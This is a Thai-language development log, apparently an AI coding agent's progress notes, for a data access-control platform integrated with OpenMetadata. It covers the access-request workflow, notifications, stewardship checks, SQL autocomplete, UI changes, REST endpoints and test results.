**ไม่แก้โดยตั้งใจ:** `GET /v1/access/assets/{fqn}` · `/history/{fqn}` · `/principals/{username}` ยังเปิดให้ทุกคนที่ login อ่าน — javadoc ของ `AccessResource` ตัดสินไว้แต่แรกว่า *"an access list is not a secret from the people governed by it"* ถ้าผู้ใช้อยากปิด ให้ใช้ `Stewardship.oversees` / `overseesEverything` ที่เตรียมไว้แล้ว

### BA.1a 🐛 "ไม่มี owner → platform admin ตัดสิน" แต่ไม่ขึ้นใน Inbox ของ admin (ผู้ใช้รายงาน)
- **สาเหตุ:** คำขอที่ค้างบน `demo-pg.salesdb.sales.customer` (ไม่มี owner) **ถูกขอโดย `admin` เอง** และ admin มีคนเดียว — กติกา "Nobody decides their own request" ตัดมันออกจาก Inbox ของคนขอ (ถูกต้อง) → **ไม่มีใครตัดสินได้เลย** แต่หน้าจอยังเขียนว่า *"a platform administrator decides"* = สัญญาคนที่ทำอะไรไม่ได้
- **แก้:** `AccessRequestStore.nobodyElseDecides(requester, fqn)` — จริงเมื่อ owner ทุกคนคือผู้ขอเอง (user owner เท่านั้น — team อาจมีสมาชิกคนอื่น) **และ** ไม่มี PLATFORM_ADMIN (global, `enabled`) คนอื่น · `StoredRequest.stranded` (เฉพาะ PENDING) · `AccessEligibility.Verdict.stranded` + `QueryResource` ใส่ `stranded` ใน refusal
- **UI:** `describeApprovers(approvers, stranded)` → *"No owner is recorded for this table and there is no other platform administrator, so nobody can decide this yet. Record an owner in OpenMetadata or add another administrator."* · หน้า request: ขั้น timeline เปลี่ยนเป็น **"Nobody can decide this yet"** สีแดง แทน "Waiting for a decision"
- **ไม่ได้ทำ:** ให้ admin ตัดสินคำขอตัวเองเมื่อไม่มีใครอื่น — ขัดกับ separation of duty (FR-2.6) · ทางที่ถูกคือ fallback approver ที่ config ได้ใน **Access Request Workflow Design** (BA.6)
- เทสต์: `AccessRequestIT.Deciding.stranded` (ไม่มี admin เลย → stranded · มี admin → ไม่ · admin คนเดียวขอเอง → stranded และไม่อยู่ใน Inbox ตัวเอง · เพิ่ม admin คนที่สอง → ไม่ · ตัดสินแล้ว → ไม่) · `accessRequests.test.ts` +1 · `AccessRequestsPage.test.tsx` +1

### BA.2 ของใหม่
- **`auth/Stewardship.java`** (dac-service) — คำตอบเดียวของ "ใครดูแล table นี้": `governs` (admin/POLICY_AUTHOR ทุกที่ · DATA_OWNER ตาม `scopes` เทียบทีละ segment ด้วย `Fqns.isDescendantOrSelf` → `prod.Sales` ≠ `prod.SalesArchive` · owner ที่ไม่มี scope = ไม่ได้เป็นเจ้าของอะไร) · `oversees` (= governs + AUDITOR) · `overseesEverything`
- **`GrantStore.reaches`**
- **Frontend `auth/stewardship.ts` `governs(user, fqn)`** — สำเนาฝั่ง UI (เทียบ `===` หรือ `startsWith(scope + '.')`) · `AccessTab.tsx` ซ่อนปุ่ม **Grant access** และ **Revoke** ถ้าไม่ governs (`GrantRow.onRevoke` เป็น optional) — server ยังเป็นตัวตัดสินจริง

### BA.3 UI ตามที่ผู้ใช้สั่ง
- **แถบขอบซ้ายสีน้ำเงินออกหมด** (ผู้ใช้: ดูเหมือน AI ทำ) — กล่อง *Reason* ในหน้า request → เป็นย่อหน้าธรรมดา `text-primary` ไม่มีกล่อง · แถว attribute ในหน้า Profile → เหลือกรอบปกติ · แถวที่เลือกในรายการ request → เหลือแค่พื้นสีอ่อน · **ห้ามกลับไปใช้ `border-l-4` / แถบ accent ซ้ายอีก** (ตัวที่เหลือใน `QueryPage.tsx:570` คือ drag handle ไม่ใช่ของตกแต่ง)
- **เอาช่อง "Grant for … days" ออกจากแผง Your decision** — Approve ส่ง `days: request.requestedDays` (ระยะที่ขอ ซึ่งแสดงอยู่ในช่อง *For* ด้านบนแล้ว) · server ยังรับ `days` สั้นลงได้เหมือนเดิม · จะกลับมาอยู่ในขั้น Configure ของ M9 slice 2

### BA.4 เทสต์
- **`StewardshipTest`** 6 (unit) · **`StewardshipGuardsTest`** 11 (unit, Mockito — Grants 6 · Simulation 3 · Enforcement 2)
- **`AccessRequestIT.Deciding`** +2 — `ownerTypeMatters` (team ชื่อเดียวกับ user owner ตัดสินไม่ได้ · owner จริงยังได้) · `grantReach` (ตรง · case-insensitive · group ซ้อน 2 ชั้น · null)
- Frontend **`AccessTab.test.tsx`** ใหม่ 4 · `AccessRequestsPage.test.tsx` แทน 2 เคส shorten/bound ด้วย `leaves an open-ended ask open-ended` + assert ว่าไม่มีช่อง Grant days
- ผล: ดูตาราง Current Progress (unit **713** · integration **217** · frontend **36 suites / 307 tests**)

### BA.5 ⚠️ ผู้ใช้สั่งต่อ (2026-09-25) — M9 slice 2 ต้องเป็นแบบนี้
> *"หลังจาก approve แล้ว ให้ส่งต่อไปที่คน Configure ไม่ใช่หรอ อันนี้ทำ auto เลยหรอ"* → ตอนนี้ (slice 1) **Approve ออก grant ทันที** (`grantForRequest` ใน `AccessRequestStore.approve`) — ยังไม่ใช่ที่ผู้ใช้ต้องการ
> *"Data Access Request ให้มี 2 รูปแบบ คือ 1. Manual Configure (Default) ให้ Approve เสร็จ ส่งต่อไปที่คนทำ Configure แล้วมี Status อื่นอีก จนไปถึง ทำเสร็จ Completed 2. Automatically อันนี้ยาก ใส่เป็น Roadmap ไว้ก่อน"*

### BA.6 ⚠️ ผู้ใช้ขอเพิ่ม (2026-09-25) — ยังไม่ได้ทำ เข้าคิวรวมกับ M9 slice 2
1. **Access Request Workflow Design Configuration** — *"ส่งต่อได้หลายๆ คน … Configure การขอเป็นหลาย Step ได้ ทำได้ทั้งแบบ parallel, Sequence (need approve from all, need approve from only one, …)"*
   → workflow template (ผูกกับ scope: ORG / domain / service / database / schema / table เหมือน policy) = ลำดับ **stage** · แต่ละ stage มี approver หลายคน (user / team / role / owner / steward / custodian ของ asset) + กติกา **ALL / ANY / N-of-M** · stage ต่อกันแบบ **sequence** หรือกลุ่ม **parallel** · fallback approver เมื่อไม่มี owner (แก้ BA.1a ถาวร) · ผู้ขอไม่นับเป็น approver ของตัวเองเสมอ · ต่อท้ายด้วยขั้น **Configure → COMPLETED** (BA.5)
2. **Dashboard: ใครใกล้หมดสิทธิ์ใน table ไหน** — *"ถ้าเลือก 10 วัน ระบบจะแสดง User ที่ใกล้จะหมดอายุใน table อะไร"* + ตัวนับถอยหลัง → endpoint `GET /v1/access/grants/expiring?withinDays=N` (จาก `grant.valid_until`, กรองตาม `Stewardship.oversees`) + widget บน Dashboard
3. **สถิติจำนวนการขอใช้ table** — *"อยากให้เก็บสถิติจำนวนที่ขอใช้ table ไว้ด้วย เผื่อเอาไว้ทำ Dashboard"* → `access_request` ไม่ลบแถวอยู่แล้ว = ข้อมูลดิบครบ (ขอ / อนุมัติ / ปฏิเสธ / ถอน ต่อ table ต่อช่วงเวลา) + `audit_query` นับการใช้จริง · ทำ endpoint สรุปรายวัน/ต่อ table ตอนทำ Dashboard

→ slice 2: **Manual Configure เป็น default** — `PENDING → APPROVED (รอ configure) → IN_PROGRESS → COMPLETED` (+ REJECTED / WITHDRAWN / CANCELLED) · คน configure = Owner / Steward / Custodian · **Automatically = Roadmap เท่านั้น** ห้ามทำตอนนี้

## รอบก่อนหน้า — **ข้อ AZ: หน้า Access requests แบ่งเป็นแท็บ Inbox / My requests · กระดิ่งแจ้งเตือนจริง · ตัวเลขบนเมนู Requests** (+ ข้อ AY.6 เส้นคั่นแทนจุด — commit `04cbc93`)

ผู้ใช้ขอ: *"หน้า Access Request แบ่ง Sub tab ในหน้าจอให้ดีไหม ว่าเป็น My Request, Inbox / และต้องมี Notification ด้วย / ออกแบบหน้านี้ให้สวยหน่อย"* และก่อนหน้านั้น *"จุดพวกนี้คือะไรอะ ไม่สวย"* (จุด `·` คั่นข้อมูลบนหัวหน้า asset — ลอกสไตล์ OM มา → เปลี่ยนเป็นเส้นแนวตั้งบางๆ แล้วใน `04cbc93`)

### AZ.1 Backend — `V22__access_request_notice.sql` + 2 endpoint
- **ไม่มีตาราง "notification" แยก** — เหตุการณ์คือแถวของ `audit_access_request` (V21) อ่านตรงๆ ไม่ copy (สองที่เก็บข้อเท็จจริงเดียวกัน = วันหนึ่งจะไม่ตรงกัน) ที่เก็บเพิ่มมีแค่ `access_request_notice_seen(username PK lower-case, seen_at)` = อ่านถึงไหนแล้ว ใช้นับ "N new"
- index ใหม่ 2 ตัว: `audit_access_request_requester_idx (lower(requester_username), occurred_at DESC)` · `audit_access_request_action_idx (action, occurred_at DESC)`
- `GET /api/v1/access-requests/notifications` → `{unseen, inboxPending, minePending, seenAt, items[]}` — `items` แต่ละตัวมี `kind` (REQUESTED/WITHDRAWN/APPROVED/REJECTED) · `side` (INBOX/MINE) · `requestId` · `assetFqn` · `actor` · `note` · `occurredAt` · `unseen`
  - ฝั่ง INBOX = การขอ/ถอนของ table ที่คนนี้ **ตัดสินได้** (owner match ใช้ของ engine ไม่ใช่ SQL — แบบเดียวกับ inbox) · ฝั่ง MINE = คำตอบต่อคำขอของตัวเอง (**ไม่รวมการขอของตัวเอง** — ไม่ต้องแจ้งสิ่งที่ตัวเองเพิ่งทำ)
  - list ถูก cap แต่ `unseen` ไม่ถูก cap
- `POST /api/v1/access-requests/notifications/seen` → ตั้ง `seen_at = now()` ของคนเรียกเท่านั้น (per person, ประวัติไม่หาย)

### AZ.2 Frontend — กระดิ่ง (`TopNav.tsx` `Notifications`, export แล้วเพื่อเทสต์)
- ตัวเลขแดงนับ **สิ่งที่ยังไม่เคยเห็น** ไม่ใช่ของที่ค้าง — กระดิ่งที่ติดตลอดเวลาทำให้คนเลิกมอง · เปิด popover = อ่านแล้ว (`markRequestNoticesSeen` เฉพาะตอนมีของใหม่) · จุดสีน้ำเงินค้างไว้จนปิด popover
- หัว popover: "N requests waiting for your decision" + ปุ่ม **Review** → `/requests?tab=inbox`
- แต่ละแถว: avatar ของคนทำ + badge เล็ก (✓ อนุมัติ / ✕ ปฏิเสธ / ↩ ถอน / 🔑 ขอ) + "actor verb table" + note ของการปฏิเสธ + เวลาไทยแบบ relative → คลิกไป `/requests?tab=inbox|mine&id=<requestId>`
- admin ยังได้ alert crawl ของ OM ที่พัง/ไม่เคยรันในกระดิ่งเดียวกัน · non-admin **ไม่เรียก** `/system/sync-status` เลย
- ว่าง: "You're all caught up"
- `pages/requests/useRequestNotices.ts` — query เดียว (`NOTICES_KEY`) poll ทุก 30 วิ ใช้ร่วมกันทั้งกระดิ่ง / เมนูซ้าย / แท็บ → ตัวเลขสามที่ไม่มีทางไม่ตรงกัน

### AZ.3 Frontend — เมนูซ้าย (`AppShell.tsx` `NavItem`, export แล้ว)
- "Requests" มี pill ตัวเลข `inboxPending` (เกิน 9 → `9+`) · ตอนพับเมนูเหลือจุด + aria-label "…, N waiting" · 0 = ไม่วาดอะไร

### AZ.4 Frontend — หน้า `/requests` เขียนใหม่ (`AccessRequestsPage.tsx`)
- **Header card**: ไอคอน + "Access requests" + คำอธิบาย + ปุ่ม "Find a table to request" (→ `/catalog`) + สถิติ 2 ช่อง "Waiting for your decision" / "Your open requests" คั่นด้วยเส้นบาง
- **แท็บ** `role=tablist`: **Inbox** · **My requests** พร้อมตัวเลข · state อยู่ใน URL `?tab=inbox|mine&status=&id=` (แชร์ลิงก์/Back ได้) · ไม่มี `tab` → ถ้ามีของรอตัดสินเปิด Inbox ไม่งั้นเปิด My requests
- **Master/detail** (`lg:grid-cols-[24rem_1fr]`): ซ้าย = ตัวกรอง Pending/Approved/Rejected/Withdrawn/All (`role=radiogroup`, บรรทัดเดียว เลื่อนแนวนอนได้) + รายการ (Inbox มี avatar ผู้ขอ, Mine มีไอคอน table) · ขวา = รายละเอียด: หัว + FQN link + "Open table" · Requested by / For / Purpose / Asked · Reason · `<details>` "What was refused" (deniedBy + SQL ที่โดนปฏิเสธ) · **Activity timeline** · ฟอร์ม Decide (Inbox) หรือ Withdraw (Mine)
- ค่าเริ่มต้นตัวกรอง: Inbox = Pending · Mine = All
- `?id=` ที่ไม่อยู่ในรายการ (เช่นมาจากกระดิ่งแต่ตัวกรองไม่ตรง) → ดึงเดี่ยวผ่าน `fetchRequest` · ดึงไม่ได้ → "That request is not one you can see, or it no longer exists."
- logic การตัดสิน **ไม่เปลี่ยน** (ย่อวันได้อย่างเดียว · reject ต้องมี note · approve ไม่ปลด mask)

### AZ.5 เทสต์
- **`AccessRequestIT` +5 (`Notices`)**: owner ได้ยินเฉพาะ table ที่ตัดสินได้ · requester ได้ยินคำตอบไม่ใช่การขอของตัวเอง · ถอนแล้วคนตัดสินได้ยินและ pending ลด · mark seen หยุดตัวเลข ประวัติอยู่ แยกต่อคน · list cap / count ไม่ cap → **`AccessRequestIT` 28 · integration รวม 214**
- **`AccessRequestsPage.test.tsx` 22** (tabs 5 · inbox 12 · my requests 5) · **`RequestNotices.test.tsx` ใหม่ 10** (กระดิ่ง 7 · เมนูซ้าย 3) → **frontend 35 suites / 302 tests**
- ทดสอบบนระบบจริง (`localhost:8090/Arak/`, Flyway → v22) ด้วย Playwright: admin / analyst_a / analyst_b — เมนู "Requests 3", กระดิ่ง "Notifications, N new", Inbox 3 แถว, Decide render, My requests + Withdraw, popover ของผู้ขอเห็น "admin rejected your request for …"

### AZ.6 ข้อควรรู้ในการรันเครื่อง dev
- **TaskStop ฆ่าแค่ `sh` ของ bring-up แต่ `java` ลูกยังถือ :8080 อยู่** → หา PID ของ :8080 (`Get-NetTCPConnection -LocalPort 8080`) ยืนยันว่า CommandLine เป็น `dac-service.jar` ของ ARAK แล้วค่อย `Stop-Process` ก่อน bring-up ใหม่ ไม่งั้น migration ใหม่ไม่ถูกรัน

## รอบก่อนหน้า — **ข้อ AY: ปุ่ม "Open in OpenMetadata" พัง (500) · Request access ย้ายขึ้นมุมขวาบนของหน้า asset · หัวหน้า asset จัดใหม่แบบ OpenMetadata · ทดสอบ flow ขอสิทธิ์ทั้งเส้น + seed เคส demo**

ผู้ใช้ถาม 3 เรื่องติดกัน (2026-09-25):
- *"ทำไม Openin Openmetadata แล้วเจอแบบนี้"* — กดแล้วได้ HTTP 500 `InvalidPathException` บน `/catalog/http:/<om-host>/...`
- *"ปุ่ม Request Access ตรงไหนอะ / แล้วทดสอบหรือยัง Flow Access Control ทั้ง Flow / ช่วยทดสอบ แล้วสร้าง Case จริงในระบบหน่อย เดี๋ยวจะเอาไว้ demo"*
- *"หน้า Asset Detail การจัดวางไม่สวย เหมือน Openmetdata / และ Request Access ควรจะไปอยู่ด้านบนขวาไหม"* (แนบภาพหน้า table ของ OM เทียบกับของเรา) → *"ต่อครับ"*

### AY.1 🐛 "Open in OpenMetadata" → 500 — สาเหตุสองชั้น
1. **Frontend:** ปุ่มของ `@openmetadata/ui-core-components` ที่มี `href` เป็น react-aria `Link` → react-aria ส่งทุก `href` ผ่าน `useHref` ของ `RouterProvider` เรา ซึ่ง `useHref()` ของ react-router ถือ URL เต็ม `http://…` เป็น **path สัมพัทธ์ในแอป** → ลิงก์กลายเป็น `/Arak/catalog/http:/…` แทนที่จะออกไป OM
   - แก้: `frontend/app/src/AriaRouter.tsx` (ใหม่) — `isExternalHref()` จับ href ที่มี scheme (`http:` `https:` `mailto:` …) หรือ `//host` · `AriaRouter` ครอบ `RouterProvider` ด้วย `useHref` ที่ **ปล่อยลิงก์ภายนอกไว้ตามที่เขียน** และใส่ base path `/Arak/` ให้ route ในแอปเหมือนเดิม · `main.tsx` ใช้ `AriaRouter` แทนการประกอบ `RouterProvider` เอง
2. **Backend:** `SpaServlet` เอา path แปลกๆ นั้นไป `Path.resolve()` → บน Windows `:` ในชื่อ path โยน `InvalidPathException` → **500** แทนที่จะเป็นหน้าแอป
   - แก้: `SpaServlet` จับ `InvalidPathException` → ถ้า path ดูเหมือนไฟล์ (มีนามสกุล) ตอบ **404**, ไม่งั้นส่ง `index.html` เหมือน route อื่นของ SPA
- เทสต์: `AriaRouter.test.tsx` 10 เคส (ลิงก์ไป OM คง href เดิม · route ในแอปยังได้ `/Arak/` นำหน้า · `isExternalHref` 8 แบบ: `https://` · `HTTP://` · `mailto:` · `//host` = ภายนอก / `/catalog/x` · `catalog/x` · `svc.db` · ว่าง = ภายใน) · `SpaServletTest.unusualCharacters()` (`/catalog/http:/om.example.test:8585/…` → 200 index.html ไม่ใช่ 500 · `/catalog/svc:db/app.js` → 404)

### AY.2 Request access บนหน้า asset — **ย้ายขึ้นมุมขวาบน** ข้าง "Open in OpenMetadata" / "View as someone"
เหตุผล: OM วาง action ของ asset ไว้มุมขวาบน คนหาปุ่มที่นั่น — และคนเดิน catalog ไม่ควรต้องเขียน SQL แล้วโดนปฏิเสธก่อนถึงจะรู้ว่าต้องขอใคร (ปิดข้อที่ค้างใน M13: *"ปุ่มเดียวกันบนหน้า asset ใน Catalog"*)
- `pages/catalog/AssetRequestAccess.tsx` → export `AssetAccessAction({asset})` · เฉพาะ `TABLE` / `VIEW` (schema / service ไม่มีแถวให้ grant) · ถาม server ผ่าน `fetchEligibility` (queryKey `['access-requests','eligibility',fqn]` — ส่งคำขอแล้ว invalidate `access-requests` ทำให้ปุ่มเปลี่ยนเอง)
- สถานะที่ปุ่มบอก (**server ตัดสินทุกอย่าง** header พูดแค่ที่ถูกบอก):
  | สถานะจาก server | สิ่งที่เห็นมุมขวาบน |
  |---|---|
  | `readable` | ป้ายเขียว **"You can read this"** (ไม่ใช่ปุ่ม) |
  | มี `openRequestId` | ปุ่มรอง **"Access requested"** (ไอคอนนาฬิกา) → ลิงก์ `/requests` |
  | `requestable` | ปุ่มหลักสีน้ำเงิน **"Request access"** → เปิด dialog ฟอร์ม (เหตุผล + จำนวนวัน) |
  | ติด `blockedBy` (DENY / ชั้นบนปฏิเสธ) | ปุ่มรองรูปกุญแจ **"Request access"** → dialog บอกชื่อ policy ที่ขวาง **ไม่มีฟอร์ม** (ขอ owner ไปก็ไม่ช่วย) |
  | ไม่ requestable และไม่มี blockedBy / ยังโหลด / error | ไม่แสดงอะไร |
- dialog = react-aria `ModalOverlay` + `Modal` + `Dialog aria-label="Request access"` แบบเดียวกับ `GrantDialog` · ส่งแล้วค้าง dialog ไว้บอก **"Request sent"** + ลิงก์ Access requests
- `pages/query/RequestAccess.tsx` แตกชิ้นให้ใช้ซ้ำ: export **`RequestAccessForm`** (ฟอร์ม + mutation · catalog mode ส่ง `attemptedSql`/`deniedBy` = null) · **`RequestedNote`** · **`BlockedNote`** · `Note` รับ `className` — **หน้า Query ยังเหมือนเดิมทุกอย่าง** (กล่องใต้ refusal)

### AY.3 หัวหน้า asset จัดใหม่ตามแบบ OpenMetadata
ของเดิม: ลิงก์ Back ลอยๆ + ชื่อ + ชิป owner + แท็บแบบ segmented · ของใหม่ (`AssetDetailPage.tsx`):
- **การ์ดขาวใบเดียว** `rounded-xl border shadow-xs`:
  - **Breadcrumb** `Catalog › service › database › schema › table` — ชั้นแม่เป็นลิงก์ไป `/catalog/<fqn ชั้นนั้น>` (asset ชั้นแม่มีจริงในแคตาล็อก) · ใช้ `segments()` ของ `lib/fqn.ts` จึงไม่แตก segment ที่มีจุดในเครื่องหมายคำพูด (`"Sales.DB"`) และ quote กลับตอนทำลิงก์ · ชั้นสุดท้าย `aria-current="page"`
  - ไอคอน + **ชื่อ** + ปุ่ม **Copy FQN** + description · **มุมขวา:** `AssetAccessAction` · Open in OpenMetadata · View as someone
  - **แถบสถิติคั่นด้วยเส้นตั้งบางๆ** (`w-px self-stretch bg-border-secondary` สูงเท่า label+ค่า — เดิมเป็นจุดแบบ OM ผู้ใช้บอก *"จุดพวกนี้คืออะไร ไม่สวย"* จึงเปลี่ยน): Type · **Domains** (แสดงเฉพาะ domain ชั้นลึกสุด ตัด ancestor ด้วย `isAncestor` · title = FQN เต็ม · เกินหนึ่ง = `+N`) · **Owners** (avatar ตัวอักษรแรก + ชื่อ · title บอก *named on this asset* / *inherited from …* · ไม่มี = **"No owner"** สีเตือน) · Tier (badge) · Certification · Source · Columns · ค่าว่าง = `--`
- **แท็บเป็นการ์ดแยก** แบบ OM: ขีดใต้สี brand ที่แท็บที่เปิดอยู่ · badge จำนวน column เป็นสีทึบเมื่อ active · `role="tablist"` เดิม
- sidebar: panel Owners ย้ายขึ้นไปอยู่ในแถบสถิติแล้ว · Location เพิ่ม **FQN**
- `BackLink` ยังใช้ในหน้า error
- ตรวจด้วยตาในเบราว์เซอร์จริง (playwright, 1440×900) ครบ: analyst_a บน `assignments` (ปุ่มน้ำเงิน → dialog) · `users` (กุญแจ → ชื่อ policy DENY) · `customers` (Access requested) · `demo-pg…customer` (Risk / Credit · No owner) · admin แท็บ Columns (badge 3 สีทึบ)

### AY.4 ทดสอบ flow ขอสิทธิ์ทั้งเส้น + seed เคส demo (บนระบบที่รันอยู่)
- **E2E smoke 30/30 ผ่าน** ผ่าน API จริง: eligibility (readable / requestable / blocked / open) · ขอ → ซ้ำโดนปฏิเสธ (มีคำขอเปิดอยู่แล้ว) · ผู้ขออนุมัติของตัวเองไม่ได้ · approve → grant ออกจริง → query อ่านได้ (PII ยัง mask) · reject ต้องมีเหตุผล · withdraw · DENY policy ขอไม่ได้ · audit ครบทุกขั้น
- **เคส demo ที่ค้างไว้ในระบบ:**
  - analyst_a → `dtp-iprm…assignments` = ปุ่ม Request access · `…users` = กุญแจ (DENY `deny-app-login-accounts`) · `…customers` = Access requested
  - admin → `/requests` มี **3 คำขอรอพิจารณา**
  - analyst_c → Query `demo-pg` `sales.customer` ได้แถว CNX-01 และ PII ถูก mask (grant จากคำขอที่อนุมัติ)
  - analyst_b มีคำขอที่ **ถูกปฏิเสธพร้อมเหตุผลภาษาไทย** · analyst_a มีคำขอที่ **ถอนเอง**
- ข้อควรรู้ตอน demo: owner ใน OM ยังไม่มี login ในเครื่องนี้ → **admin เป็นคนตัดสิน** · การอ่านขึ้นกับหน้าต่างเวลา 08:00–23:00 Asia/Bangkok ของ policy · รายการของ analyst_a มีแถวประวัติจาก smoke test ปนอยู่

### AY.5 เทสต์
- Backend: `./mvnw -o verify -Pintegration` → **BUILD SUCCESS** · unit **696** (dac-service **191** — +1 `SpaServletTest.unusualCharacters`) · integration **209** · Failures 0 Errors 0
- Frontend: **34 suites / 283 tests** เขียว (+10 `AriaRouter.test.tsx` · `AssetRequestAccess.test.tsx` 9 เคส — ปุ่ม/ฟอร์มซ่อนก่อนกด · dialog ส่ง body ถูก (`sourceId`/`attemptedSql`/`deniedBy` = null, reason trim) แล้วขึ้น Request sent · Cancel ไม่ส่ง · readable · Access requested → `/requests` · blocked ไม่มีฟอร์ม · ไม่ requestable = ว่าง · schema ไม่ fetch · error = ว่าง · `AssetDetailPage.test.tsx` +4 — breadcrumb ลิงก์ชั้นแม่ ไม่ลิงก์ตัวเอง · segment ที่มีจุดในเครื่องหมายคำพูดเป็นชั้นเดียว · แถบสถิติชื่อ domain ชั้นลึกสุด (ไม่ใช่ Finance) + owner + Tier1 · No owner) · `tsc --noEmit` exit 0 · `vite build` (`VITE_BASE=/Arak/`) ผ่าน

---

## รอบก่อนหน้า — **M13 เสร็จ + M9 slice 1: SQL Suggest ในหน้า Query · ติดสิทธิ์แล้วขอ Data Owner ได้ · หน้า `/requests` · UI จัดให้เข้า theme**

> โจทย์: *"หน้า Query ให้มี Suggest ด้วยสิ ถ้าติดสิทธิ ก็ให้ไปขอ Data Owner"* + *"ทำ UI ให้ออกมาตรง Theme และสวยๆ นะ ดู Open metadata ได้"*
> ผลคือคนที่พิมพ์ SQL เห็นก่อนกด Run ว่า table ไหนอ่านได้ table ไหนต้องขอ — และถ้าโดนปฏิเสธ หน้าเดียวกันส่งคำขอไปหา owner ได้ทันที โดย owner อนุมัติ/ปฏิเสธจากหน้า `/requests`
> ⚠️ **พฤติกรรม approve ของรอบนี้ (approve = ออก grant ทันที) กำลังจะถูกเปลี่ยนตามที่ผู้ใช้สั่ง — ดูข้อ AX.9**

### AX.1 Schema — `V21__access_request.sql`

| ตาราง | สาระ |
|---|---|
| `access_request` | `asset_fqn` · `requester_id` (FK principal, `ON DELETE SET NULL`) + `requester_username` (เก็บชื่อไว้ให้ audit อ่านออกแม้ principal ถูกลบ) · `data_source_id` · `reason` (**ห้ามว่าง** — check constraint) · `purpose` · `requested_days` (1–365 หรือ null = until revoked) · `attempted_sql` · `denied_by` (ข้อความ refusal ตอนที่ติด) · `status` PENDING / APPROVED / REJECTED / WITHDRAWN · `decided_by` / `decided_at` / `decision_note` · `grant_id` (FK `access_grant`) |
| constraint | `access_request_decided` — ถ้าไม่ใช่ PENDING ต้องมี decided_at · `access_request_approved_has_grant` — `(status='APPROVED') = (grant_id IS NOT NULL)` ← **slice 2 ต้องคลายตัวนี้** |
| unique index | PENDING ได้แค่ **1 คำขอต่อ (asset, requester)** — กดซ้ำได้ 409 |
| `access_grant` | เพิ่ม FK `request_id → access_request` + check `(source='request') = (request_id IS NOT NULL)` — grant ที่มาจากคำขอย้อนกลับไปหาคำขอได้เสมอ (ตามที่ออกแบบ `source`/`request_id` ไว้ตั้งแต่ Phase 1 ใน FR-7) |
| `audit_access_request` | append-only ทุกการเปลี่ยนสถานะ |

### AX.2 `AccessEligibility` — ตอบได้ 3 แบบ ไม่ใช่ 2

ก่อนจะชวนใครไปขอสิทธิ์ ต้องรู้ก่อนว่า **grant ช่วยได้จริงไหม** — ไม่งั้น owner จะอนุมัติแล้วคนขอก็ยังโดนปฏิเสธเหมือนเดิม
1. **readable** — อ่านได้อยู่แล้ว
2. **requestable** — ที่ติดอยู่คือ "ไม่มี policy ไหน allow" / ไม่มี grant → grant แก้ได้ → คืน `approvers[]` (owner ของ table จาก OM ตรงหรือตกทอด, team ด้วย) และ `openRequestId` ถ้ามีคำขอค้างอยู่แล้ว
3. **neither** — ติด **DENY** หรือชั้นบนปฏิเสธ (time window, IP, purpose ฯลฯ) ซึ่ง grant ไม่มีทาง override (FR-3.3 / FR-5.1) → คืน `blockedBy` = ชื่อ policy ที่ขวาง **ไม่ส่งไปหา owner** ให้คนขอไปคุยกับเจ้าของ policy แทน

approver = owners ของ asset ใน OM · ถ้า asset ไม่มี owner เลย → platform admin (จะได้ไม่มีคำขอที่ไม่มีใครตัดสินได้)

### AX.3 REST — `AccessRequestResource` (`/api/v1/access-requests`)

| method | path | หมายเหตุ |
|---|---|---|
| POST | `/` | `{assetFqn, sourceId, reason, purpose, days, attemptedSql, deniedBy}` · reason ว่าง → 400 · days นอก 1–365 → 400 · ซ้ำ → 409 · อ่านได้อยู่แล้ว / ติด DENY → 409 พร้อมเหตุผล |
| GET | `/mine` | คำขอของฉัน |
| GET | `/inbox?status=` | คำขอที่ฉันตัดสินได้ (default PENDING) · แต่ละตัวมี `mayDecide` จาก server |
| POST | `/check` | `{assetFqns[], purpose}` → `{fqn: boolean}` **ของผู้เรียกเท่านั้น** (ไม่รับ username — ห้ามใช้ถามสิทธิ์คนอื่น) · จำกัดจำนวนต่อครั้ง (`MAX_CHECK`) · body ว่าง → 400 |
| GET | `/eligibility/{fqn}` | verdict เต็มตาม AX.2 |
| GET | `/{id}` | id ผิดรูป → 404 ไม่ใช่ 500 · route `/mine` `/inbox` ไม่ถูก `/{id}` กลืน |
| POST | `/{id}/approve` | `{days, note}` · **days = null → เท่าที่ขอ** (ไม่ใช่ until revoked) · **ลดได้ ขยายไม่ได้** (ขอ 7 อนุมัติ 30 → 400) · 0 → 400 · คำขอ until revoked อนุมัติแบบมีกำหนดได้ · คนขออนุมัติของตัวเองไม่ได้ (403 — separation of duty FR-2.6) · ซ้ำ → 409 · **ตอนนี้ออก grant `source=request` ทันที** |
| POST | `/{id}/reject` | `{note}` **ต้องมี note** ให้คนขอรู้ว่าทำไม |
| POST | `/{id}/withdraw` | เจ้าของคำขอเท่านั้น (คนอื่น 403/404) · เฉพาะ PENDING |

ทุก endpoint ใช้ `request.getRemoteAddr()` เป็น context IP (ไม่เชื่อ X-Forwarded-For — กติกาเดียวกับ QueryResource)
refusal 403 ของ `POST /v1/query` ตอนนี้พก `assetFqn` · `requestable` · `blockedBy` · `approvers[]` · `openRequestId` มาด้วย (`QueryResource` / `QueryService` / `DecisionService` / `QueryRewriter` ส่ง FQN ของ table ที่ติดขึ้นมา)
grant ที่ออกจากคำขอเป็น grant ธรรมดาทุกอย่าง — **compose กับทุก policy ตามปกติ: ไม่ override DENY ไม่ปลด mask ไม่ปลด row filter** (หน้า `/requests` เขียนประโยคนี้ไว้ให้ owner อ่านก่อนกด)

### AX.4 SQL Suggest ในหน้า Query (`sqlCompletion.ts` + `SqlEditor.tsx`)

- `sqlCompletion.ts` เป็น **pure function** — รู้ตำแหน่ง cursor ว่าอยู่หลัง `FROM`/`JOIN` (เสนอ table) · หลัง `alias.` (เสนอ column ของ table นั้น) · หลัง `SELECT`/`WHERE`/… (เสนอ column ของ table ใน FROM + keyword) · ไม่เสนออะไรใน string literal / comment
- rule-based ล้วน **ไม่ส่งอะไรให้ LLM** (M16 เป็นอีกงาน)
- ป้ายต่อ table: **Readable** (เขียว) / **Request needed** (เหลือง) — มาจาก `POST /access-requests/check` ครั้งเดียวต่อ source (cache ใน TanStack Query) ไม่ยิงทุกครั้งที่พิมพ์
- คีย์: ↑ ↓ เลื่อน · Enter/Tab ใส่ · Esc ปิด · มี footer บอกคีย์ใต้ list (aria-hidden เพราะ listbox ประกาศเองอยู่แล้ว)
- list เป็น portal `position: fixed` + พลิกขึ้นด้านบนเมื่อชิดขอบล่าง (ไม่โดน `overflow: hidden` ของ card ตัด)
- `role=combobox` / `listbox` / `aria-activedescendant` ครบ

### AX.5 ขอสิทธิ์จากจุดที่โดนปฏิเสธ (`RequestAccess.tsx`)

